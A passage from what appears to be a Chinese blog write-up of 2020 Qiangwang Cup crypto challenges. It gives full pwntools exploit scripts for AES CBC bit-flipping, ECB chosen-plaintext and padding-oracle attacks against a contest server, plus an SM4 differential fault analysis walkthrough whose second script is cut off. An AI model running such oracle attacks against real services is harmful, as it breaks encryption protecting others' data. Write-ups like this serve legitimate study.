        <content type="html"><![CDATA[<h3 id="modestudy">modestudy</h3><h4 id="题解分析">[题解分析]</h4><p>qwb经典study系列（套娃</p><ul><li><p>Challenge-1: AES/CBC字节翻转</p></li><li><p>Challenge-2: AES/CBC Encrypt Oracle（iv fixed），发送<code>b'\x00'*32</code>，即可还原iv</p></li><li><p>Challenge-3: ECB，将第三组cipher换为第五组cipher即可</p><p><img src= "/img/loading.gif" data-src="/2020/08/24/WriteUp-%E5%BC%BA%E7%BD%91%E6%9D%AF2020-Crypto/image-20200824134157397.png"></p></li><li><p>Challenge-4: ECB选择明文攻击 (<span class="math inline">\(E_{k}(pt||salt)\)</span>)，至多256*len(salt)次即可恢复salt</p><p>(由于访问频率限制问题，在爆破单个salt比特位时，宜将256组拼接，在一次中请求加密)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mt = <span class="string">b""</span></span><br><span class="line"><span class="keyword">for</span> lsb <span class="keyword">in</span> range(<span class="number">0x100</span>):</span><br><span class="line">    mt += (prefix + secret + bytes([lsb]))</span><br><span class="line">    ct = chal4_enc(mt)[:<span class="number">16</span>*<span class="number">0xff</span>]</span><br></pre></td></tr></table></figure></li><li><p>Challenge-5: 通过报错发现<code>assert(len(pt) % 2 == 0)</code>，因此<code>myblockencrypt_ecb</code>是个分组长度仅为2bytes的ECB，爆破即可（同样由于频率限制，宜拼接一次性发送，打表本地查找）</p></li><li><p>Challenge-6: Padding Oracle Attack（crack_range为第一块，且IV可控）</p></li></ul><h4 id="exp">[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string, re, random</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> unhexlify, hexlify</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">"139.224.254.172"</span>, <span class="string">"7777"</span>)</span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">passpow</span><span class="params">()</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">"sha256"</span>)</span><br><span class="line">    msg = io.recvline().strip().decode()</span><br><span class="line">    prefix = re.findall(<span class="string">r"\((.*)\+"</span>,msg)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        answer = <span class="string">''</span>.join(random.choice(string.ascii_letters + string.digits) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>))</span><br><span class="line">        cipher = sha256((prefix + answer).encode()).digest()</span><br><span class="line">        <span class="keyword">if</span> cipher[<span class="number">0</span>] &lt; <span class="number">8</span>:</span><br><span class="line">            io.sendlineafter(<span class="string">"?="</span>, answer)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    io.sendlineafter(<span class="string">"teamtoken="</span>, <span class="string">"icq6c57ba701346474cd670a5f3b1c66"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> bytes(x ^ y <span class="keyword">for</span> x, y <span class="keyword">in</span> zip(a, b))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">chal1</span><span class="params">()</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"[-] your choice:"</span>, <span class="string">"1"</span>)</span><br><span class="line">    io.recvuntil(<span class="string">"[+] cookie:"</span>)</span><br><span class="line">    msg = io.recvline().strip().decode()</span><br><span class="line">    cookie = re.findall(<span class="string">r"^(.*);checksum=(.*)"</span>, msg)[<span class="number">0</span>]</span><br><span class="line">    session, checksum = cookie[<span class="number">0</span>], cookie[<span class="number">1</span>]</span><br><span class="line">    session = session.encode()</span><br><span class="line">    checksum = unhexlify(checksum)</span><br><span class="line">    payload = session[<span class="number">-16</span>:<span class="number">-1</span>] + <span class="string">b'1'</span></span><br><span class="line">    checksum = hexlify(xor(xor(payload, checksum[<span class="number">-32</span>:<span class="number">-16</span>]), session[<span class="number">-16</span>:]) + checksum[<span class="number">-16</span>:]).decode()</span><br><span class="line">    io.sendlineafter(<span class="string">"[-] cookie:"</span>, session[:<span class="number">-1</span>].decode() + <span class="string">"1;checksum="</span> + checksum)</span><br><span class="line">    print(<span class="string">"[+] challenge-1 pass"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">chal2</span><span class="params">()</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"[-] your choice:"</span>, <span class="string">"2"</span>)</span><br><span class="line">    io.recvuntil(<span class="string">"sha256"</span>)</span><br><span class="line">    msg = io.recvline().strip().decode()</span><br><span class="line">    iv_hash = re.findall(<span class="string">r"\(iv\)=(.*)"</span>, msg)[<span class="number">0</span>] <span class="comment"># sha256(iv).hexdigest()</span></span><br><span class="line">    <span class="comment"># ct = hexlify(b'\x00' * 32).decode()</span></span><br><span class="line">    ct = <span class="string">b'\x00'</span> * <span class="number">32</span></span><br><span class="line">    io.sendlineafter(<span class="string">"[-] your choice:"</span>, <span class="string">"1"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"[-] c:"</span>, ct)</span><br><span class="line">    msg = io.recvline().strip().decode()</span><br><span class="line">    pt = re.findall(<span class="string">r"\[\+\] (.*)"</span>, msg)[<span class="number">0</span>]</span><br><span class="line">    pt = unhexlify(pt)</span><br><span class="line">    iv = xor(pt[:<span class="number">16</span>], pt[<span class="number">16</span>:])</span><br><span class="line">    <span class="keyword">assert</span>(sha256(iv).hexdigest() == iv_hash)</span><br><span class="line">    io.sendlineafter(<span class="string">"[-] your choice:"</span>, <span class="string">"2"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"[-] iv(encode hex):"</span>, hexlify(iv))</span><br><span class="line">    print(<span class="string">"[+] challenge-2 pass"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">chal3</span><span class="params">()</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"[-] your choice:"</span>, <span class="string">"3"</span>)</span><br><span class="line">    io.recvuntil(<span class="string">"[+] cookie="</span>)</span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    cookie = io.recvline().strip()</span></span><br><span class="line"><span class="string">    for i in range(0, len(cookie), 16):</span></span><br><span class="line"><span class="string">        print(cookie[i:i+16])</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    io.recvuntil(<span class="string">"[+] 128bit_ecb_encrypt(cookie):"</span>)</span><br><span class="line">    cookie = unhexlify(io.recvline().strip())</span><br><span class="line">    cookie = cookie[:<span class="number">16</span>*<span class="number">2</span>] + cookie[<span class="number">16</span>*<span class="number">4</span>:<span class="number">16</span>*<span class="number">5</span>] + cookie[<span class="number">16</span>*<span class="number">3</span>:]</span><br><span class="line">    cookie = hexlify(cookie)</span><br><span class="line">    io.sendlineafter(<span class="string">"[-] input your encrypted cookie(encode hex):"</span>, cookie)</span><br><span class="line">    print(<span class="string">"[+] challenge-3 pass"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">chal4_enc</span><span class="params">(m)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"[-] your choice:"</span>, <span class="string">"1"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"[-] input(encode hex):"</span>, hexlify(m))</span><br><span class="line">    io.recvuntil(<span class="string">"[+] encrypted msg: "</span>)</span><br><span class="line">    c = unhexlify(io.recvline().strip())</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">chal4</span><span class="params">()</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"[-] your choice:"</span>, <span class="string">"4"</span>)</span><br><span class="line">    io.recvuntil(<span class="string">"sha256"</span>)</span><br><span class="line">    msg = io.recvline().strip().decode()</span><br><span class="line">    secret_hash = re.findall(<span class="string">r"\(secret\)=(.*)"</span>, msg)[<span class="number">0</span>]</span><br><span class="line">    secret = <span class="string">b""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> tqdm(range(<span class="number">15</span>, <span class="number">-1</span>, <span class="number">-1</span>)):</span><br><span class="line">        prefix = <span class="string">b"\x00"</span> * i</span><br><span class="line">        cipher = chal4_enc(prefix)[:<span class="number">16</span>]</span><br><span class="line">        mt = <span class="string">b""</span></span><br><span class="line">        <span class="keyword">for</span> lsb <span class="keyword">in</span> range(<span class="number">0x100</span>):</span><br><span class="line">            mt += (prefix + secret + bytes([lsb]))</span><br><span class="line">        ct = chal4_enc(mt)[:<span class="number">16</span>*<span class="number">0xff</span>]</span><br><span class="line">        <span class="keyword">for</span> lsb <span class="keyword">in</span> range(<span class="number">0x100</span>):</span><br><span class="line">            <span class="keyword">if</span> ct[<span class="number">16</span>*lsb:<span class="number">16</span>*(lsb+<span class="number">1</span>)] == cipher:</span><br><span class="line">                secret += bytes([lsb])</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    io.sendlineafter(<span class="string">"[-] your choice:"</span>, <span class="string">"2"</span>)</span><br><span class="line">    <span class="keyword">assert</span>(sha256(secret).hexdigest() == secret_hash)</span><br><span class="line">    io.sendlineafter(<span class="string">"[-] secret(encode hex):"</span>, hexlify(secret))</span><br><span class="line">    print(<span class="string">"[+] challenge-4 pass"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">chal5_enc</span><span class="params">(m)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"[-] your choice:"</span>, <span class="string">"1"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"[-] input(encode hex):"</span>, hexlify(m))</span><br><span class="line">    io.recvuntil(<span class="string">"[+] myblockencrypt_ecb(your_input).encode(\"hex\"):"</span>)</span><br><span class="line">    c = unhexlify(io.recvline().strip())</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">chal5</span><span class="params">()</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"[-] your choice:"</span>, <span class="string">"5"</span>)</span><br><span class="line">    io.recvuntil(<span class="string">"sha256"</span>)</span><br><span class="line">    msg = io.recvline().strip().decode()</span><br><span class="line">    secret_hash = re.findall(<span class="string">r"\(secret\)=(.*)"</span>, msg)[<span class="number">0</span>]</span><br><span class="line">    io.recvuntil(<span class="string">"[+] myblockencrypt_ecb(secret).encode(\"hex\")="</span>)</span><br><span class="line">    secret_cipher = unhexlify(io.recvline().strip())</span><br><span class="line">    mt = <span class="string">b""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x10000</span>):</span><br><span class="line">        mt += int.to_bytes(i, <span class="number">2</span>, <span class="string">"big"</span>)</span><br><span class="line">    <span class="comment"># context.log_level = 'debug'</span></span><br><span class="line">    ct = chal5_enc(mt)</span><br><span class="line">    secret_list = [ct[<span class="number">2</span>*i:<span class="number">2</span>*(i+<span class="number">1</span>)] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x10000</span>)]</span><br><span class="line">    secret = <span class="string">b""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(secret_cipher), <span class="number">2</span>):</span><br><span class="line">        cur_secret = secret_list.index(secret_cipher[i:i+<span class="number">2</span>])</span><br><span class="line">        secret += int.to_bytes(cur_secret, <span class="number">2</span>, <span class="string">'big'</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"[-] your choice:"</span>, <span class="string">"2"</span>)</span><br><span class="line">    <span class="keyword">assert</span>(sha256(secret).hexdigest() == secret_hash)</span><br><span class="line">    io.sendlineafter(<span class="string">"[-] secret(encode hex):"</span>, hexlify(secret))</span><br><span class="line">    print(<span class="string">"[+] challenge-5 pass"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">chal6_dec</span><span class="params">(c)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"[-] your choice:"</span>, <span class="string">"1"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"[-] input your iv+c (encode hex):"</span>, hexlify(c))</span><br><span class="line">    resp = io.recvline().strip().decode()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"success"</span> <span class="keyword">in</span> resp:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">chal6</span><span class="params">()</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"[-] your choice:"</span>, <span class="string">"6"</span>)</span><br><span class="line">    io.recvuntil(<span class="string">"[+] iv+aes128_cbc(key,iv,padding(secret)):"</span>)</span><br><span class="line">    msg = unhexlify(io.recvline().strip())</span><br><span class="line">    iv, cipher = msg[:<span class="number">16</span>], msg[<span class="number">16</span>:<span class="number">32</span>]</span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    secret = b''</span></span><br><span class="line"><span class="string">    for i in range(16):</span></span><br><span class="line"><span class="string">        for j in tqdm(range(0x100)):</span></span><br><span class="line"><span class="string">            ct = iv[:15-i] + bytes([j]) + iv[16-i:] + cipher</span></span><br><span class="line"><span class="string">            if chal6_dec(ct) == True:</span></span><br><span class="line"><span class="string">                secret = bytes([iv[-i - 1] ^ j ^ (i + 1)]) + secret</span></span><br><span class="line"><span class="string">                iv = iv[:15-i] + xor(ct[15-i:16], bytes([(i + 1) ^ (i + 2)]) * (i + 1))</span></span><br><span class="line"><span class="string">                break</span></span><br><span class="line"><span class="string">        print(secret)</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    secret = <span class="string">b'\xe6?\xee\x07\xa3\x07\xaa\xc8\x8em\xb5\xa0\x90'</span></span><br><span class="line">    iv = iv[:<span class="number">16</span>-len(secret)] + xor(iv[<span class="number">16</span>-len(secret):], xor(secret, bytes([len(secret) + <span class="number">1</span>]) * len(secret)))</span><br><span class="line">    <span class="comment"># context.log_level = 'debug'</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(secret), <span class="number">16</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> tqdm(range(<span class="number">0x100</span>)):</span><br><span class="line">            ct = iv[:<span class="number">15</span>-i] + bytes([j]) + iv[<span class="number">16</span>-i:] + cipher</span><br><span class="line">            <span class="keyword">if</span> chal6_dec(ct) == <span class="literal">True</span>:</span><br><span class="line">                secret = bytes([iv[-i - <span class="number">1</span>] ^ j ^ (i + <span class="number">1</span>)]) + secret</span><br><span class="line">                iv = iv[:<span class="number">15</span>-i] + xor(ct[<span class="number">15</span>-i:<span class="number">16</span>], bytes([(i + <span class="number">1</span>) ^ (i + <span class="number">2</span>)]) * (i + <span class="number">1</span>))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        print(secret)</span><br><span class="line">    io.sendlineafter(<span class="string">"[-] your choice:"</span>, <span class="string">"2"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"[-] secret(encode hex):"</span>, hexlify(secret))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    passpow()</span><br><span class="line">    chal1()</span><br><span class="line">    chal2()</span><br><span class="line">    chal3()</span><br><span class="line">    chal4()</span><br><span class="line">    chal5()</span><br><span class="line">    chal6()</span><br><span class="line">    io.sendlineafter(<span class="string">"[-] your choice:"</span>, <span class="string">"7"</span>)</span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="/2020/08/24/WriteUp-%E5%BC%BA%E7%BD%91%E6%9D%AF2020-Crypto/Snipaste_2020-08-24_13-54-28.png"></p><h3 id="fault">fault</h3><h4 id="题解分析-1">[题解分析]</h4><h5 id="sm4加密原理">SM4加密原理</h5><p>SM4明文长度128bits，分为4个32bits的字<span class="math inline">\(X_{0},X_{1},X_{2},X_{3}\)</span>，进行32轮加密，每轮的示意图如下：</p><p><img src= "/img/loading.gif" data-src="/2020/08/24/WriteUp-%E5%BC%BA%E7%BD%91%E6%9D%AF2020-Crypto/Snipaste_2020-08-24_14-00-26.png"></p><p>其中SM4的S盒均相同，线性变换L为<code>lambda y:(y ^^ (rotl(y, 2)) ^^ (rotl(y, 10)) ^^ (rotl(y, 18)) ^^ (rotl(y, 24)))</code></p><p>抽象成1*32矩阵与32*32矩阵相乘的变换即可，发现该32*32的系数矩阵可逆，即L可逆（注意转置系数矩阵，且要在GF(2)下）</p><p>第32轮加密后，要实现一次<span class="math inline">\(X_{32},X_{33},X_{34},X_{35}\)</span>四字的逆序，即C=(<span class="math inline">\(X_{35},X_{34},X_{33},X_{32}\)</span>)</p><h5 id="sm4密钥扩展">SM4密钥扩展</h5><p>系统参数<span class="math inline">\(FK=(FK_{0},FK_{1},FK_{2},FK_{3}),FK_{i}\in F_{2}^{32}\)</span>及<span class="math inline">\(CK=(CK_{0},CK_{1}...,CK_{31}),CK_{i}\in F_{2}^{32}\)</span>固定</p><p>密钥为<span class="math inline">\((MK_{0},MK_{1},MK_{2},MK_{3})\)</span>，则初始化</p><p><span class="math inline">\((K_{0},K_{1},K_{2},K_{3})=(MK_{0}\oplus FK_{0},MK_{1}\oplus FK_{1},MK_{2}\oplus FK_{2},MK_{3}\oplus FK_{3})\)</span></p><p>迭代<span class="math inline">\(rk_{i}=K_{i+4}=K_{i}\oplus T(K_{i+1}\oplus K_{i+2}\oplus K_{i+3}\oplus CK_{i}),i=0,1,...,31\)</span></p><p>即可获得完整的32个轮密钥<span class="math inline">\(rk_{i}\)</span></p><p>(T函数与SM4加密轮函数中的S+L基本类似，只需将L改作<code>lambda y:(y ^^ (rotl(y, 13)) ^^ (rotl(y, 23))</code>即可)</p><h5 id="sm4故障差分分析">SM4故障差分分析</h5><p>基于能在SM4的某轮轮函数中注入错误，挺有意思的攻击- -</p><p>攻击流程如下：</p><ul><li>选择随机明文，发送至服务端进行加密，拿到返回的ct</li><li>选择和上一步相同的明文，但在某轮注入错误，获取返回的ct_ast，同时也记录密文差分ct_diff</li><li>降轮次的常规差分攻击or直接对S盒的差分攻击</li></ul><p>由于本题中的出错轮次(0<sub>31)，出错字节下标(0</sub>15)，出错字节异或上的fault(0~0xfe)均可控</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">self.send(<span class="string">b"give me the value of r f p"</span>, <span class="literal">False</span>)</span><br><span class="line">tmp = self.recv(prompt=<span class="string">b":"</span>)</span><br><span class="line">r, f, p = tmp.split(<span class="string">b" "</span>)</span><br><span class="line">r = int(r) % <span class="number">0x20</span></span><br><span class="line">f = int(f) % <span class="number">0xff</span></span><br><span class="line">p = int(p) % <span class="number">16</span></span><br><span class="line">ct = self.encrypt2(key, unhexlify(pt), r, f, p)</span><br></pre></td></tr></table></figure><p>因此我们可以直接将其转化为对单个S盒的差分攻击（常规差分攻击基于高概率差分特征，爆破key部分比特观察counter来实现，但对于单个S盒的差分攻击则只需求交集即可）</p><p><strong>且在对于单个S盒的差分攻击中，若固定输入差分或输出差分其中任一者，均只能至多将key候选降至2个，想要确定唯一的key，则必须有至少两个输出差分来进行共同差分分析取key交集</strong></p><p>也正是因为这一点，我们要破解key[31]，所选注入fault的地方应为第29轮的第16个字节，且要注入两次不同错误来共同分析（比如当我们选择第31轮出错时，由于题目只允许在每一轮的后四个字节之一出错，因此无法篡改X31'，其值将固定为0x00000000）</p><p><img src= "/img/loading.gif" data-src="/2020/08/24/WriteUp-%E5%BC%BA%E7%BD%91%E6%9D%AF2020-Crypto/Snipaste_2020-08-24_18-01-26.png"></p><p>在第29轮注入fault（假设为0x22）后，</p><p>可以发现第29轮的差分为0x00000000, 0x00000000, 0x00000000, 0x00000022</p><p>则第32轮的输出差分为<span class="math inline">\(X31&#39;\oplus X35&#39;\)</span>，输入差分为<span class="math inline">\(X32&#39;\oplus X33&#39;\oplus X34&#39;\)</span>，且ct_diff对应的ct和ct_ast也均已知，逆L模块后对S盒进行差分攻击即可</p><p>上述攻击成功后，会令K[31]留下两个candidate，此时再注入fault=0x33，重复操作即可唯一确定K[31]</p><p>得到K[31]后，我们可对攻击K[31]时的所有密文数据进行一轮解密，得到31轮加密后的结果及加密差分，类似对S盒进行差分分析，直到恢复出K[30]和K[29]</p><p>但由于SM4的密钥生成算法，至少需要四个连续K，才能恢复出完整32个子密钥，因此我们对26轮第16个字节注入错误0x22和0x33，并利用已得到的K[29:32]进行解密得到第29轮加密后的结果及加密差分，此时情况已等价于求解K[31]</p><p>恢复出子密钥K[28:32]后，逆向得到32个子密钥，解密得到flag</p><h4 id="exp-1">[exp]</h4><p><strong>Exp被我写的极其冗余...凑合看8</strong></p><p><code>get_data.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string, re</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> hexlify, unhexlify</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> mbruteforce</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">"39.101.134.52"</span>, <span class="string">"8006"</span>)</span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proof_of_work</span><span class="params">()</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">"sha256"</span>)</span><br><span class="line">    msg = io.recvline().strip().decode()</span><br><span class="line">    suffix = re.findall(<span class="string">r"XXX\+([^\)]+)"</span>, msg)[<span class="number">0</span>]</span><br><span class="line">    cipher = re.findall(<span class="string">r"== (.*)"</span>, msg)[<span class="number">0</span>]</span><br><span class="line">    proof = mbruteforce(<span class="keyword">lambda</span> x: sha256((x + suffix).encode(<span class="string">"latin-1"</span>)).hexdigest() ==</span><br><span class="line">                        cipher, string.ascii_letters + string.digits, length=<span class="number">3</span>, method=<span class="string">'fixed'</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Give me XXX:"</span>, proof)</span><br><span class="line">    io.sendlineafter(<span class="string">"teamtoken:"</span>, <span class="string">"icq6c57ba701346474cd670a5f3b1c66"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_enc_flag</span><span class="params">()</span>:</span></span><br><span class="line">    io.recvline()</span><br><span class="line">    enc_flag = io.recvline().strip().decode()</span><br><span class="line">    <span class="keyword">return</span> enc_flag</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(m)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">'&gt; '</span>, <span class="string">'1'</span>)</span><br><span class="line">    